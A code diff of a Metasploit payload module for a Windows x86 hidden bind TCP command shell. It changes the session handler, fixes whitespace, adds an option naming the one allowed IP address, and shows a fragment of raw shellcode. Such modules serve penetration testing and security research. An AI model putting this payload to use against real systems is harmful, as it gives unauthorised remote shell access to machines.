@@ -4,7 +4,7 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/bind_hidden_tcp'
+require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -25,13 +25,13 @@ module Metasploit3
         [
           'vlad902',    # original payload module (single_shell_bind_tcp)
           'sd',         # original payload module (single_shell_bind_tcp)
-          'Borja Merino <bmerinofe[at]gmail.com>'	# Add Hidden ACL functionality
+          'Borja Merino <bmerinofe[at]gmail.com>' # Add Hidden ACL functionality
         ],
       'License'       => MSF_LICENSE,
       'References'    => ['URL', 'http://www.shelliscoming.com/2014/03/hidden-bind-shell-keep-your-shellcode.html'],
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
-      'Handler'       => Msf::Handler::BindHiddenTcp,
+      'Handler'       => Msf::Handler::BindTcp,
       'Session'       => Msf::Sessions::CommandShell,
       'Payload'       =>
         {
@@ -69,6 +69,11 @@ module Metasploit3
       "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
         }
       ))
+
+    register_options([
+      OptAddress.new('AHOST', [true, "IP address allowed", nil])
+    ])
   end
 
 end
+
